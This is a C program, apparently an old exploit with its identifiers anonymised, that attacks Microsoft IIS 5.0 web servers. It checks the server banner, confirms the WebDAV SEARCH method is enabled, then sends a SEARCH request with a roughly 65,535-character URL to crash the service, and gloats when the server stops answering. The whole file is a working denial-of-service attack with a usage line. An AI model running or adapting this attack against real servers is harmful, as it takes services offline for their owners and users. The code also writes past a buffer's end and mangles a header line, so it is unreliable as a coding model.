
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int trash ;
struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_family; int sin_port; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int myrequest ;
typedef int heck ;
typedef int buffer ;
typedef int WSADATA ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 () ;
 scalar_t__ FUNC_1 (int,int *) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int ) ;
 scalar_t__ FUNC_5 (char*,char*) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 () ;
 int FUNC_8 (int) ;
 int FUNC_9 (char*,char,int) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (int,char*,char*,int ) ;
 int FUNC_13 (int ,int ,int ) ;
 int FUNC_14 (char*,char*,...) ;
 char* FUNC_15 (char*) ;
 int * FUNC_16 (char*,char*) ;

int FUNC_17(int VAR_2, char *VAR_3[])
{

WSADATA VAR_4;

int VAR_5;char VAR_6[100];
char *VAR_7;
char VAR_8[100];


struct hostent *VAR_9;
struct sockaddr_in VAR_10;
char VAR_11[65535] ="";
char VAR_12[80000];
char VAR_13[] =
"<?xml version=\"1.0\"?>\r\n"
"<g:searchrequest xmlns:g=\"DAV:\">\r\n"
"<g:sql>\r\n"
"Select \"DAV:displayname\" from scope()\r\n"
"</g:sql>\r\n"
"</g:searchrequest>\r\n";



FUNC_7();

if(FUNC_1(0x0101,&VAR_4)!=0) {
FUNC_10("Error :Cudn't initiate winsock!");
return 0;
}

if(VAR_2<2)

{FUNC_10("\nUsage : %s <I.P./Hostname>\n\n",VAR_3[0]);
FUNC_4(0);}

if ( (VAR_9 = FUNC_6(VAR_3[1]))==0)
{
FUNC_10("error: can't resolve '%s'",VAR_3[1]);
return 1;
}

FUNC_10("\nChecking web server %s\n",VAR_3[1]);
VAR_7=(char *)FUNC_5("GET / HTTP/1.0\r\n\n",VAR_3[1]);


if (FUNC_16(VAR_7,"IIS/5.0") == ((void*)0))

{ FUNC_10("\n\r----> %s is not running IIS 5.0! adios !\n",VAR_3[1]); }


else

{

FUNC_10("\n\r----> Aww rite! IIS 5.0 found on %s !\n",VAR_3[1]);

FUNC_14(VAR_6,"SEARCH / HTTP/1.0\r\n\n",40);

VAR_7=(char *)FUNC_5(VAR_6,VAR_3[1]);

if (FUNC_16(VAR_7,"HTTP/1.1 411 Length Required") != ((void*)0))

{ FUNC_10("\n\r----> METHOD SEARCH ALLOWED\r\n"); }


else

{

FUNC_10("\n----> Method SEARCH not Allowed ! adios...\n");
FUNC_4(0);

}

VAR_10.sin_port = FUNC_8(80);
VAR_10.sin_family = VAR_0;
VAR_10.sin_addr = *((struct in_addr *)VAR_9->h_addr);

if ((VAR_5 = FUNC_13(VAR_0, VAR_1, 0)) == -1){
FUNC_10("error: can't create socket");
return 1;
}


if ((FUNC_3(VAR_5, (struct sockaddr *) &VAR_10, sizeof(VAR_10))) == -1){
FUNC_10("Error:Cudn't Connect\r\n");
return 1;
}

VAR_11[sizeof(VAR_11)]=0x00;

FUNC_9(VAR_11,'S',sizeof(VAR_11));
FUNC_9(VAR_12,0,sizeof(VAR_12));
FUNC_9(VAR_8,0,sizeof(VAR_8));
FUNC_14(VAR_12,"SEARCH /%s HTTP/1.1\r\nHost: %s\rnContent-type: text/xml\r\nContent-Length: ",VAR_11,VAR_3[1]);

FUNC_14(VAR_12,"%s%d\r\n\r\n",VAR_12,FUNC_15(VAR_13));
FUNC_10("\r\nDoSsing the server...<pray>\n");
FUNC_12(VAR_5,VAR_12,FUNC_15(VAR_12),0);

FUNC_12(VAR_5,VAR_13,FUNC_15(VAR_13),0);

FUNC_11(VAR_5,VAR_8,sizeof(VAR_8),0);
if(VAR_8[0]==0x00)
{
FUNC_10("Server is DoSsed! Now run !! F-B-eyee is after j00...\r\n");

}
else

FUNC_10("Server is prolly patched.\r\n");

FUNC_2(VAR_5);


}

FUNC_0();

return 1;
}
